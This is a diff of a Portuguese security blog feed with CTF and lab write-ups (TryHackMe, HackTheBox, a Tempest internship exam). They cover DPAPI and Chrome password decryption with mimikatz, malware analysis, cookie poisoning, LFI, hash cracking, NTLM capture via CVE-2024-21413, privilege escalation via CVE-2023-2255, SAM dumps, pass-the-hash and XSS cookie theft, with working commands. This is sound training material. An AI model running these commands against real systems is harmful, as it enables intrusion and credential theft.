-A prova de estágio da Tempest ocorreu até o dia 08/01/2025 até 13/01/2025 e uma das etapas da prova, foi necessário ajudar uma empresa em que havia sido alvo de hackativitas.
+<h2 id="descriptografando-a-senha-do-usuário">Descriptografando a senha do usuário.</h2>
+<p>Será necessário utilizar o dpapimk2john para extrair a hash da senha para que o john consiga descriptografar.</p>
 
-Foi fornecido o link do site da empresa. Ao acessá-lo, uma mensagem deixada pelos atacantes estava visível:
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DPAPImk2john -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c local -S S-1-5-21-3854677062-280096443-3674533662-1001 &gt; hash.txt
+</code></pre></div></div>
 
+<p>Dessa forma, é possível realizar o bruteforce na senha:
+<img src="https://i.imgur.com/Oq2kBAH.png" alt="" /></p>
 
-Analisando o código-fonte do site, foi encontrada uma assinatura dos atacantes no arquivo js:
+<h2 id="descriptografando-a-master-key">Descriptografando a master key.</h2>
 
+<p>Para avançarmos, será necessário o uso da ferramenta <a href="https://github.com/ParrotSec/mimikatz">mimikatz</a>. O mimikatz permite a extração de credenciais de autenticação de sistemas Windows, como senhas em texto simples, hashes de senhas, tickets Kerberos, e etc.</p>
 
-Pesqui...
-    </summary>
-  
+<p>Utilizando o comando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::masterkey /in:"AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580" /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password: ?????????
+</code></pre></div></div>
+<p>É possível extrair a master key.</p>
 
-  </entry>
+<p><img src="https://i.imgur.com/nt7VAP0.png" alt="" /></p>
 
-  
-  <entry>
-    <title>THM - Chrome</title>
-    <link href="http://localhost:4000/posts/THM-Chrome/" rel="alternate" type="text/html" title="THM - Chrome" />
-    <published>2024-12-09T13:00:12-03:00</published>
-  
-    <updated>2024-12-09T13:00:12-03:00</updated>
-  
-    <id>http://localhost:4000/posts/THM-Chrome/</id>
-    <content src="http://localhost:4000/posts/THM-Chrome/" />
-    <author>
-      <name>Yoshiro</name>
-    </author>
+<h2 id="descriptografando-as-senhas">Descriptografando as senhas.</h2>
 
-  
-    
-    <category term="THM" />
-    
-    <category term="hard" />
-    
-  
+<p>Antes de realizarmos o procedimento para conseguirmos obter as credenciais armazenadas localmente no Google Chrome, será necessário extrair a chave armazenada no arquivo Local State. Dessa forma:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat AppData/Local/Google/Chrome/User\ Data/Local\ State | jq .os_crypt.encrypted_key -r
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/Fs31vy3.png" alt="" /></p>
 
-  
-    <summary>
-      
+<p>Voltando ao mimikatz:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::chrome /in:"AppData/Local/Google/Chrome/User Data/Default/Login Data" /masterkey:ca4387e???????????????0ddb868a03ee6a3f9840 /encryptedKey:RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACHYWuMqo69SL4WmCEqRBWAAAAAAAIAAAAAABBmAAAAAQAAIAAAAHPuV6P/8jN+rng8E61Z0xxi2hUf4Q4oxa5gFqSnctqdAAAAAA6AAAAAAgAAIAAAAAEF9lst8zMKmCFJ3WmD46TZY/xJF+s5Xf9mTQ2wa16ZMAAAABFU2C2V+l6K3y7ROKkA0cIaWyuXB9i7zUwBBu6mt7vM2QGZtqmjhcX6ZSWrX8JUwkAAAADgBkMLAP19Rtax5T8aKAESgwV+ABz65DOgEGwwSkkQMbWrwz7p42SzpfJUj7jcyUSTOblLRNtB8YTwhm3wCQSi
+</code></pre></div></div>
 
+<p>E assim, finalmente conseguimos visualizar as credenciais armazenadas:
+<img src="https://i.imgur.com/vLP3Au0.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="THM" /><category term="hard" /><category term="THM" /><category term="hard" /><summary type="html"><![CDATA[Contexto Um agente malicioso entrou na rede e extraiu algo, mas a pergunta é: o que exatamente?]]></summary></entry><entry><title type="html">HTB Sherlocks - Heartbreaker-Continuum</title><link href="http://localhost:4000/htb/sherlocks/HTB-HeartbreakerContinuum/" rel="alternate" type="text/html" title="HTB Sherlocks - Heartbreaker-Continuum" /><published>2024-10-25T07:00:12-03:00</published><updated>2024-10-25T07:00:12-03:00</updated><id>http://localhost:4000/htb/sherlocks/HTB-HeartbreakerContinuum</id><content type="html" xml:base="http://localhost:4000/htb/sherlocks/HTB-HeartbreakerContinuum/"><![CDATA[<h1 id="heartbreaker-continuum">Heartbreaker-Continuum</h1>
 
+<p>Após um recente relatório de violação de dados na empresa, o cliente enviou um arquivo executável potencialmente malicioso. O arquivo se originou de um link em um e-mail de phishing recebido por um usuário vítima. Seu objetivo é analisar o binário para determinar sua funcionalidade e as possíveis consequências que ele pode ter na rede da empresa. Ao analisar a funcionalidade e as potenciais consequências desse binário, você poderá obter informações valiosas sobre o alcance da violação de dados e identificar se ele facilitou a exfiltração de dados. Compreender as capacidades do binário permitirá que você forneça ao cliente um relatório abrangente detalhando a metodologia do ataque, os dados potenciais em risco e as etapas recomendadas para mitigação.</p>
 
+<h2 id="task-1">Task 1</h2>
+<p><em>Para referenciar e identificar com precisão o binário suspeito, por favor forneça o hash SHA256 dele.</em></p>
 
+<p>Com o comando <em>sha256num</em> é possível identificar o hash do binário:
+<img src="https://i.imgur.com/C5DnPIa.png" alt="" /></p>
 
-      Contexto
-Um agente malicioso entrou na rede e extraiu algo, mas a pergunta é: o que exatamente?
+<p>R: 12DAA34111BB54B3DCBAD42305663E44E7E6C3842F015CCCBBE6564D9DFD3EA3</p>
 
-Analisando os pacotes.
+<h2 id="task-2">Task 2</h2>
+<p><em>Quando o arquivo binário foi originalmente criado, de acordo com seus metadados (UTC)?</em></p>
 
-A princípio, foi disponibilizado um pacote de rede para que seja realizada a análise do mesmo. Utilizando o Wireshark, podemos perceber que, em um primeiro momento, a maioria do tráfego ocorre através do protocolo SMB. O SMB é um protocolo de comunicação que permite o compart...
-    </summary>
-  
+<p>Para os próximos passos, usarei o PeStudio. O PeStudio é uma ferramenta de análise estática utilizada para examinar arquivos executáveis e permite a inspeção de executáveis sem a necessidade de executá-los.</p>
 
-  </entry>
+<p>O PeStudio me deu a informação de quando o programa foi compilado no campo compiler-stamp:</p>
 
-  
-  <entry>
-    <title>HTB Sherlocks - Heartbreaker-Continuum</title>
-    <link href="http://localhost:4000/posts/HTB-HeartbreakerContinuum/" rel="alternate" type="text/html" title="HTB Sherlocks - Heartbreaker-Continuum" />
-    <published>2024-10-25T07:00:12-03:00</published>
-  
-    <updated>2024-10-25T07:00:12-03:00</updated>
-  
-    <id>http://localhost:4000/posts/HTB-HeartbreakerContinuum/</id>
-    <content src="http://localhost:4000/posts/HTB-HeartbreakerContinuum/" />
-    <author>
-      <name>Yoshiro</name>
-    </author>
+<p><img src="https://i.imgur.com/jnaehNo.png" alt="" /></p>
 
-  
-    
-    <category term="HTB" />
-    
-    <category term="Sherlocks" />
-    
-  
+<p>R: 2024-03-13 10:38:06</p>
 
-  
-    <summary>
-      
+<h2 id="task-3">Task 3</h2>
+<p><em>Examinar o tamanho do código em um arquivo binário pode fornecer indicações sobre sua funcionalidade. Você poderia especificar o tamanho em bytes do código neste binário?</em></p>
 
+<p>Análisando na aba optional-header &gt; general &gt; size-of-code, é possível identificar o tamanho de bytes do código:
+<img src="https://i.imgur.com/0fcpXvC.png" alt="" /></p>
 
+<p>R: 38400</p>
 
+<h2 id="task-4">Task 4</h2>
+<p><em>Parece que o binário pode ter passado por um processo de conversão de arquivo. Você poderia determinar seu nome de arquivo original?</em></p>
 
+<p>Análisando na aba resources é possível identificar o nome do arquivo original, sendo ele, um script em powershell:
+<img src="https://i.imgur.com/kzybuZS.png" alt="" /></p>
 
-      Heartbreaker-Continuum
+<h2 id="task-5">Task 5</h2>
+<p><em>Especifique o deslocamento hexadecimal onde o código ofuscado do arquivo original identificado começa no binário.</em></p>
 
-Após um recente relatório de violação de dados na empresa, o cliente enviou um arquivo executável potencialmente malicioso. O arquivo se originou de um link em um e-mail de phishing recebido por um usuário vítima. Seu objetivo é analisar o binário para determinar sua funcionalidade e as possíveis consequências que ele pode ter na rede da empresa. Ao analisar a funcionali...
-    </summary>
-  
+<p>Para os próximos passos usarei o HxD, que é uma ferramenta de edição hexadecimal. Na minha análise identifiquei o começo do código ofuscado a partir do caractere <em>$</em>. O HxD apontou para o posição 2C74.</p>
 
-  </entry>
+<p><img src="https://i.imgur.com/FOn1uhG.png" alt="" /></p>
 
-  
-  <entry>
-    <title>Prova de estágio Tempest</title>
-    <link href="http://localhost:4000/posts/Prova-Tempest/" rel="alternate" type="text/html" title="Prova de estágio Tempest" />
-    <published>2024-06-28T18:02:12-03:00</published>
-  
-    <updated>2024-08-05T21:26:56-03:00</updated>
-  
-    <id>http://localhost:4000/posts/Prova-Tempest/</id>
-    <content src="http://localhost:4000/posts/Prova-Tempest/" />
-    <author>
-      <name>Yoshiro</name>
-    </author>
+<p>R: 2C74</p>
 
-  
-    
-    <category term="Tempest" />
-    
-  
+<h2 id="task-6">Task 6</h2>
+<p><em>O ator da ameaça ocultou o script em texto simples dentro do binário. Você pode fornecer o método de codificação usado para essa ofuscação?</em></p>
 
-  
-    <summary>
-      
+<p>Da a entender que o código está em base64 pelo seu formato e também pelo uso do caractere igual (=).</p>
 
+<p>Utilizei a ferramenta CyberChef para reverter o código oculto e, também para descriptografar o script.</p>
 
+<p><img src="https://i.imgur.com/XvTKOTd.png" alt="" />
+<img src="https://i.imgur.com/GfhiRh5.png" alt="" /></p>
 
+<p>R: Base64</p>
 
+<h2 id="task-7">Task 7</h2>
+<p><em>Qual é o cmdlet específico utilizado para iniciar downloads de arquivos?</em></p>
 
-      Prova de estágio Tempest
+<p>Análisando o script, é possível identificar logo nas primeiras linhas o comando <em>Invoke-WebRequest</em> que é utilizado para enviar solicitações HTTP e HTTPS para servidores web. Esse comando está acompanhado do -Uri que tem a finalidade de baixar arquivos.</p>
 
-Contexto
+<p><img src="https://i.imgur.com/vPaUbfG.png" alt="" /></p>
 
-A prova de estágio da Tempest ocorreu até o dia 28/07 e uma das partes dela era necessário resolver um “mini CTF”, em que, uma empresa denominada Quantum Nexys sofreu um ataque de Ransomware e procurou um time especializado para tentar reaver os dados de contratos, clientes e parceiros que foram roubados de seu servidor principal. Mas um arquivo em específico...
-    </summary>
-  
+<p>R: Invoke-WebRequest</p>
 
-  </entry>
+<h2 id="task-8">Task 8</h2>
+<p><em>Você poderia identificar possíveis Indicadores de Compromisso (IoCs) relacionados à rede após examinar o código? Separe os IPs por vírgula e em ordem crescente.</em></p>
 
-</feed>
+<p>O termo indicadores de compromisso (IOC) abrange uma ampla variedade de dados, que podem ser usados para identificar atividades maliciosas dentro do sistema ou da rede. Análisando o script, é possível identificar dois endereços Ip’s. Um está relacionado ao login de ftp para exfiltração de arquivos da vítima, e o outro está realizando o download do arquivo Superstart_MemberCard.tiff.      <br />
+<img src="https://i.imgur.com/lmKUKb4.png" alt="" />
+<img src="https://i.imgur.com/ikNK0EM.png" alt="" /></p>
 
+<p>R: 35.169.66.138,44.206.187.144</p>
 
+<h2 id="task-9">Task 9</h2>
+<p><em>O binário criou um diretório de preparação. Você pode especificar a localização desse diretório onde os arquivos coletados estão armazenados?</em></p>
+
+<p>Análisando o código é possível identitificar a pasta de arquivos coletados:
+<img src="https://i.imgur.com/nvfbo0w.png" alt="" /></p>
+
+<p>R: C:\Users\Public\Public Files</p>
+
+<h2 id="task-10">Task 10</h2>
+<p><em>Qual ID do MITRE corresponde à técnica usada pelo binário malicioso para coletar dados de forma autônoma?</em></p>
+
+<p>O mitre que corresponde a técnica é o Automated Collection:
+<img src="https://i.imgur.com/hCfKXiU.png" alt="" /></p>
+
+<p>R: T1119</p>
+
+<h2 id="task-11">Task 11</h2>
+<p><em>Qual é a senha utilizada para exfiltrar os arquivos coletados através do programa de transferência de arquivos dentro do binário?</em></p>
+
+<p>Lembram do ip em que possui um servidor ftp para exfiltração de arquivos? Bem, para que a conexão seja efetuada, foi necessário informar a senha via comando.</p>
+
+<p><img src="https://i.imgur.com/KnWbZiu.png" alt="" /></p>
+
+<p>R: M8&amp;C!i6KkmGL1-#</p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Sherlocks" /><category term="sherlocks" /><category term="htb" /><summary type="html"><![CDATA[Heartbreaker-Continuum]]></summary></entry><entry><title type="html">Prova de estágio Tempest</title><link href="http://localhost:4000/tempest/Prova-Tempest/" rel="alternate" type="text/html" title="Prova de estágio Tempest" /><published>2024-06-28T18:02:12-03:00</published><updated>2024-06-28T18:02:12-03:00</updated><id>http://localhost:4000/tempest/Prova-Tempest</id><content type="html" xml:base="http://localhost:4000/tempest/Prova-Tempest/"><![CDATA[<h1 id="prova-de-estágio-tempest">Prova de estágio Tempest</h1>
+
+<h2 id="contexto">Contexto</h2>
+
+<p>A prova de estágio da Tempest ocorreu até o dia 28/07 e uma das partes dela era necessário resolver um “mini CTF”, em que, uma empresa denominada Quantum Nexys sofreu um ataque de Ransomware e procurou um time especializado para tentar reaver os dados de contratos, clientes e parceiros que foram roubados de seu servidor principal. Mas um arquivo em específico, era referente a uma patente que foi feita recentemente e que não havia backup. Dessa forma, foi apresentado o arquivo dessa patente criptografado em uma mensagem pgp:
+<img src="https://i.imgur.com/uYE1qvH.png" alt="" /></p>
+
+<p>Além disso, também foi apresentado o link de um site em que os criminosos solicitavam um ID, que foi fornecido a empresa, e também o endereço da carteira digital que foi usada para efetuar o pagamento. Eles utilizavam desse método para verificar se o pagamento realmente foi efetuado e teoricamente, enviar a chave para descriptografar os arquivos.
+<img src="https://i.imgur.com/jqZW24I.png" alt="" /></p>
+
+<p><img src="https://i.imgur.com/BG3CoJ5.png" alt="" /></p>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<p>Eu havia feito a prova anterior da Tempest, e muitas informações valiosas já estavam disponíveis no código HTML, então, eu pulei as primeiras etapas que seriam: análise de portas abertas e diretórios.</p>
+
+<p>Análisando o código, percebi no código javascript da página um redirecionamento de dados para uma API que estava em outro domínio.</p>
+
+<p><img src="https://i.imgur.com/RxSyKuF.png" alt="img" /></p>
+
+<p>Uma tela de login foi apresentada indo até o outro domínio, era o forúm dos criminosos.
+<img src="https://i.imgur.com/hlQtWbK.png" alt="" /></p>
+
+<p>Uma das formas em que os sites utilizam para se proteger de robôs de buscas, é utilizando o robots.txt. Dessa forma, consegui verificar alguns diretórios que estavam disponíveis nesse forúm analisando o conteúdo deste arquivo.</p>
+
+<p><img src="https://i.imgur.com/ZeApVAM.png" alt="img" /></p>
+
+<p>Analisando logo o primeiro diretório (/api/), encontrei um arquivo .yaml, e neste arquivo estavam armazenadas as credenciais de um usuário do forúm que havia solicitado a alteração de senha.
+<img src="https://i.imgur.com/yxEFrt5.png" alt="img" /></p>
+
+<p>Com essas credenciais, foi possível acessar o forúm.
+<img src="https://i.imgur.com/aflV5iy.png" alt="" /></p>
+
+<p>Mas, havia um problema. Esse usuário não estava com permissões de vizualização do forúm, apenas de acesso.</p>
+
+<p>Verificando o site via Burp Suit, consegui detectar que os cookies eram enviados em forma de base64 e, dessa forma, seria possível realizar alterações que resultariam no envenamento desses cookies.
+<img src="https://i.imgur.com/e1mnicM.png" alt="img" /></p>
+
+<p>Analisando os cookies, para verificar quais informações eram passadas para que eu conseguisse altera-lo.
+<img src="https://i.imgur.com/TuXCOFJ.png" alt="" /></p>
+
+<p>Alterei a opção de enabled de false para true, resultando em:
+<img src="https://i.imgur.com/17bEkf4.png" alt="" /></p>
+
+<p>Alterando manualmente o cookie legítimo para o que foi envenenado, eu consegui visualizar o conteúdo do forúm.</p>
+
+<p><img src="https://i.imgur.com/jkj8kz6.png" alt="" /></p>
+
+<p>Nesse mesmo print, é possível identificar a empresa que foi vitíma do Ransoware e que nos contatou, e além de outras vitímas do forúm. Mas com esse usuário, não foi possível acessar o tópico do forúm.</p>
+
+<p><img src="https://i.imgur.com/d8woOSe.png" alt="" /></p>
+
+<h2 id="escalonamento-de-privilégio">Escalonamento de privilégio</h2>
+
+<p>Dessa forma, será necessário escalonar para um usuário com permissão para acessar o tópico e conseguir mais informações a respeito do ataque. Navegando pelo forúm é possível encontrar o tópico de membros no menu. Nesse tópico, é listado todos os membros do forúm juntamente com suas permissões.</p>
+
+<p><img src="https://i.imgur.com/KzlkDVq.png" alt="" /></p>
+
+<p>Novamente, envenenei os cookies, mas dessa vez, com informações dos administrador do forúm alterando a parte de username e role. Dessa forma, consegui acesso ao tópico da empresa Quantum Nexys.</p>
+
+<p><img src="https://i.imgur.com/xYEvSaR.png" alt="" /></p>
+
+<p>Infelizmente, no tópico na empresa não foi possível encontrar a chave privada ou até mesmo informações que ajudasse a encontrar a chave privada para descriptografar a mensagem.</p>
+
+<h2 id="chave-privada">Chave privada</h2>
+
+<p>Navegando pelo forúm, descobri que as chaves públicas dos usuários do forúm ficavam disponíveis nos seus perfis.</p>
+
+<p><img src="https://i.imgur.com/uufaEzn.png" alt="" /></p>
+
+<p>Guardem essa informação.</p>
+
+<p>Procurando novamente pelos diretórios do forúm, encontrei o diretório das campanhas de Ransomware e acessando-o:
+<img src="https://i.imgur.com/M036AdK.png" alt="" /></p>
+
+<p>Bom, encontrei uma pegadinha das pessoas que formularam o teste.</p>
+
+<p>Análisei e percebi que toda vez solicitavamos as chaves públicas dos usuários, o sistema buscava pelo diretório das campanhas + id da empresa. Dessa forma, acessei esse diretório manualmente e percebi que as chaves públicas e privadas estavam realmente armazenadas lá.</p>
+
+<p><img src="https://i.imgur.com/k89bijH.png" alt="" />
+<img src="https://i.imgur.com/vlQMlZr.png" alt="" /></p>
+
+<p>Tentando acessar essas chaves a partir do diretório, o sistema sempre dava como não-autorizado mesmo envenenando os cookies como administrador ou como o usuário que fez o ataque.</p>
+
+<p><img src="https://i.imgur.com/p0Cpdu2.png" alt="" /></p>
+
+<p>Percebi então, que a única forma de conseguir a chave privada, era atráves do perfil do usuário quando ele solicitava a chave pública. A ideia era de que, se daquele meio, eu conseguia acesso a chave pública, eu também conseguiria acesso a chave privada apenas alterando o valor em que a url solicitava o arquivo id_pgp.pub para id.pgp. Também envenenei os cookies para o usuário do forúm que fez o ataque (não foi o administrador), dessa forma, o site deve me retornar a chave privada desse usuário destinada a esse ataque, já que cada ataque possui uma chave privada própria.</p>
+
+<p><img src="https://i.imgur.com/iwslMHr.png" alt="" />
+<img src="https://i.imgur.com/X6jgWqK.png" alt="" /></p>
+
+<p>E… voilà! Aqui estava a chave privada. Com ela, é possível descriptografar o arquivo da patente.</p>
+
+<p><img src="https://i.imgur.com/yfBKTNP.png" alt="" />
+<img src="https://i.imgur.com/rvisDlL.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="Tempest" /><category term="tempest" /><summary type="html"><![CDATA[Prova de estágio Tempest]]></summary></entry><entry><title type="html">HTB Máquinas - Mailing</title><link href="http://localhost:4000/htb/m%C3%A1quinas/HTB-Mailing/" rel="alternate" type="text/html" title="HTB Máquinas - Mailing" /><published>2024-05-06T04:50:12-03:00</published><updated>2024-05-06T04:50:12-03:00</updated><id>http://localhost:4000/htb/m%C3%A1quinas/HTB-Mailing</id><content type="html" xml:base="http://localhost:4000/htb/m%C3%A1quinas/HTB-Mailing/"><![CDATA[<h1 id="mailing">Mailing</h1>
+
+<h2 id="enumeração">Enumeração</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(yoshiro㉿kali)-[~]
+└─$ nmap -sV -A 10.10.11.14    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 08:22 -03
+Nmap scan report for mailing.htb (10.10.11.14)
+Host is up (0.35s latency).
+Not shown: 990 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+25/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mailing
+110/tcp open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER UIDL TOP
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp open  imap          hMailServer imapd
+|_imap-capabilities: ACL IMAP4rev1 CHILDREN IDLE NAMESPACE RIGHTS=texkA0001 CAPABILITY SORT completed IMAP4 OK QUOTA
+445/tcp open  microsoft-ds?
+465/tcp open  ssl/smtp      hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+587/tcp open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+993/tcp open  ssl/imap      hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-06T11:23:15
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.23 seconds
+</code></pre></div></div>
+
+<p>É possível identificar que o servidor está rodando Microsoft-IIS/10. E esse servidor é vulneravel a ataques LFI.</p>
+
+<p><img src="https://i.imgur.com/NpRHvzW.png" alt="" /></p>
+
+<h2 id="explorando-a-vulnerabildade">Explorando a vulnerabildade</h2>
+
+<p>Indo até ../../Program+Files+(x86)/hMailServer/Logs/hmailserver_awstats.log é possível vizualizar usuários cadastrados.</p>
+
+<p><img src="https://i.imgur.com/cWfgezF.png" alt="" /></p>
+
+<p>Indo até ../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI é possível identificar uma hash de senha.</p>
+
+<p><img src="https://i.imgur.com/EWMNmkB.png" alt="" /></p>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Essa Hash se trata de uma MD5. Quebrando-a:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(yoshiro㉿kali)-[~/htb]
+└─$ hashcat -m 0 -a 0 hash.txt rockyou.txt 
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/H9j8gHV.png" alt="" /></p>
+
+<p>Com esse login, é possível acessar o telnet.</p>
+
+<p><img src="https://i.imgur.com/uyISYhF.png" alt="" /></p>
+
+<p>Pesquisando novamente encontrei esse exploit: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file</p>
+
+<p>Esse exploit permite enviar um e-mail para a Maya para capturar a senha do NTLM.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.51\mailing' --subject Yoshi
+</code></pre></div></div>
+
+<p>Utilize o responder para capturar o e-mail enviado para a Maya.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo responder -I tun0 -vudo responder -I tun0 -v
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/iHpNrkX.png" alt="" /></p>
+
+<p>Quebrando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 5600 hash.txt rockyou.txt 
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/2z5u2bf.png" alt="" /></p>
+
+<p>Utilizando o login da maya, é possível acessar a máquina via evil-winrm e conseguir a user flag.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/YfXYxzu.png" alt="" /></p>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Utilizei o CVE-2023-2255 que explora uma vulnerabilidade no LibreOffice para dar permissões a maya de administrador local.
+https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/ywnGvrv.png" alt="" /></p>
+
+<p>Utilizando o crackmapexec que permite executar comandos remotos diretamente ao sistema operacional.</p>
+
+<p>Utilizando o –sam, o crackmapexec fará um dump no banco de dados SAM. Esse banco armazena credenciais dos usuários em um sistema windows.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/Wvn2b1v.png" alt="" /></p>
+
+<p>Utilizando a hash que o crackmapexec forneceu, é possível acessar via impacket-wmiexec.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-wmiexec localadmin@10.10.11.14 -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae
+</code></pre></div></div>
+<p>Dessa forma, é possível conseguir a root flag.</p>
+
+<p><img src="https://i.imgur.com/3FOXYaW.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="HTB" /><category term="Máquinas" /><category term="máquinas" /><category term="htb" /><summary type="html"><![CDATA[Mailing]]></summary></entry><entry><title type="html">HTB Máquinas - Intuition</title><link href="http://localhost:4000/htb/m%C3%A1quinas/HTB-Intuition/" rel="alternate" type="text/html" title="HTB Máquinas - Intuition" /><published>2024-05-01T03:30:12-03:00</published><updated>2024-05-01T03:30:12-03:00</updated><id>http://localhost:4000/htb/m%C3%A1quinas/HTB-Intuition</id><content type="html" xml:base="http://localhost:4000/htb/m%C3%A1quinas/HTB-Intuition/"><![CDATA[<h1 id="intuition">Intuition</h1>
+
+<p><em>De antemão, peço desculpas por não fazer um post mais detalhado. Estou terminando as demandas da faculdade e estou correndo contra o relógio. Mas qualquer dúvida vocẽs podem entrar em contato comigo!</em></p>
+
+<h2 id="enumeração">Enumeração</h2>
+<p>Nmap:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -A -sV -sC 10.10.11.15                                                
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 06:37 -03
+Nmap scan report for 10.10.11.15
+Host is up (0.34s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
+|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://comprezzor.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.23 seconds
+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(yoshiro㉿kali)-[~]
+└─$ gobuster dns -d comprezzor.htb -w subdomains-top1million-20000.txt
+
+-comprezzor.htb
+
+-report.comprezzor.htb
+
+-auth.comprezzor.htb
+
+-dashboard.comprezzor.htb
+</code></pre></div></div>
+<h2 id="vulnerabilidade">Vulnerabilidade</h2>
+<p>Indo até report.comprezzor.htb, faça uma conta e realize o seguinte XSS.
+<img src="https://i.imgur.com/69m6csl.png" alt="" /></p>
+
+<p>Dessa forma, será possível receber os cookies da página.</p>
+
+<p><img src="https://i.imgur.com/tF8EXIt.png" alt="" /></p>
+
+<p>Com os cookies, acesse dashboard.comprezzor.htb, e com os mesmos cookies, envie outro relatório com outro XSS e, assim que um administrador entrar para ver o relátorio, é possível roubar os cookies do adm.</p>
+
